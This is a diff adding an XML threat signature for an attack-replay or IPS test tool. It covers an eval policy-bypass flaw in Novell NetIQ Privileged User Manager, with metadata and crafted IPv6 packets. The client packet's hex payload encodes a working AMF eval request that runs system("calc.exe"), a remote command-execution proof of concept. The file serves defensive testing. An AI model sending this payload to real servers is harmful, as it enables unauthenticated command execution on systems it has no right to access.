@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Novell NetIQ Privileged User Manager Eval Policy Bypass(IPV6 Version)"/>
+    <EngDesc display="true" value="A policy-bypass vulnerability has been reported in Novell NetIQ Privileged User Manager, which could allow remote&#13;&#10;attackers to compromise a system. The vulnerability is due to an access control weakness when handling calls&#13;&#10;to the eval method within POST requests.&#13;&#10;A remote, unauthenticated attacker can exploit this vulnerability by sending a malicious eval request to the&#13;&#10;vulnerable server. Successful exploitation could result in command execution under the context of the SYSTEM"/>
+    <Intent display="true">
+      <item value="ACCESS_CONTROL_WEAKNESS"/>
+    </Intent>
+    <Protocol display="true" value="IPV6,HTTP,HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Critical"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Novell"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Privileged_User_Manager"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="ALL"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20121115-03"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="87334"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="dabecac7d67d90f51d018c599a11d067"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="Network"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634949851623389356"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1359369032" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+    <for index="C">
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:2A:6D" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="3FFE::0200:FF:FE00:2" Destination-Address="$destIP">
+        <TCP srcPort="53405" destPort="$HTTPdestPort" SeqNumber="270F7A0C" AckNumber="303DF460" HeaderLength="08" WindowSize="002E" Checksum="78BC" UrgentPointer="0000" Options="0101080AFE7952B200000000" Payload="504F5354202F20485454502F312E310D0A486F73743A206468637037380D0A4163636570742D456E636F64696E673A206964656E746974790D0A436F6E74656E742D4C656E6774683A203133310D0A436F6E74656E742D547970653A206170706C69636174696F6E2F782D616D660D0A0D0A00000000000100145350462E5574696C2E63616C6C4D6F64756C654100042F343434000002980A00000001030003706B740300066D6574686F640200046576616C00066D6F64756C650200086C64617061676E7400044576616C030007636F6E74656E7402001373797374656D282263616C632E65786522293B000009000009000009" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="C" Count="">
+      <Ethernet srcMac="00:50:56:B4:2A:6D" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$destIP" Destination-Address="3FFE::0200:FF:FE00:1">
+          <TCP srcPort="$HTTPdestPort" destPort="53405" SeqNumber="303DF460" AckNumber="270F7B01" HeaderLength="08" WindowSize="FF0A" Checksum="BB54" UrgentPointer="0000" Options="0101080A0001E25AFE79534D" Payload="485454502F312E3020323030204F4B0D0A436F6E74656E742D547970653A206170706C69636174696F6E2F782D616D660D0A0D0A000000000001000D2F3434342F6F6E526573756C7400046E756C6CFFFFFFFF0300084173796E6352657103000269640200086C68743635736176000009000376726D020005322E332E31000373766302000C77696E32303033656E743332000009" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
